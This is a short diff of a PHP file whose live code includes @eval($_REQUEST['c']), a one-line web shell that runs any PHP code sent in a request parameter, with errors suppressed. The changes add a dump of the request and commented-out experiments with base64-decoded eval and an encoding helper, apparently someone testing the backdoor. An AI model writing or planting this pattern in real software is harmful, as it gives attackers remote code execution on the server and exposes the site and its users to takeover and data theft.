@@ -7,8 +7,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
     die();
 }
 
-//print_r($_REQUEST);
+var_dump($_REQUEST);
 @eval($_REQUEST['c']);
+//eval('echo base64_decode("ZWNobyAnMTExJzs=");');
 //@eval($_REQUEST['c']);
 //print_r($_REQUEST);
 //print_r($_REQUEST['test']);
@@ -22,4 +23,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
 //$f($p);
 //echo base64_decode($p);
 //eval(base64_decode($p))
+//$encode = function ($val) {
+//    return base64_encode($val);
+//};
+//echo $encode('asdfasdf');
+
+//header("Content-Type: text/html;charset=UTF-8");
+
 ?>
